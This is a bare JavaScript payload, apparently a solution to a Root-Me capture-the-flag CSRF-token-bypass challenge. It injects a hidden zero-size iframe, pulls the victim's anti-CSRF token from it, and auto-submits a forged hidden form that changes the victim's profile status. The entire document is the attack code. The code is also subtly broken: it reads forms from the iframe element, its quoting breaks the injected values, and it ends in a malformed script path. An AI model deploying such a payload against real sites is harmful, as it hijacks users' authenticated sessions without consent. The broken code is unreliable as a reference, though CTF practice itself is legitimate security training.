<script type="text/javascript">
document.writeln('<iframe id="iframe" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="0" height="0" onload="read()"></iframe>');

function read()
{
var username = 'hello';
var token = document.getElementById("iframe").forms[0].token.value;
document.writeln('<html><body>');
document.writeln('<form width="0" height="0" name="csrf" method="post" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile">');
document.writeln('<input type="hidden" name="username" value=""+username+""/><br/>');
document.writeln('<input type="hidden" name="status" value="on"/><br/>');
document.writeln('<input type="hidden" name="token" value=""+token+""/><br/>');
document.writeln('</form></body></html>');
document.csrf.submit();

}
</script>


<script src="......./script.js"></script>
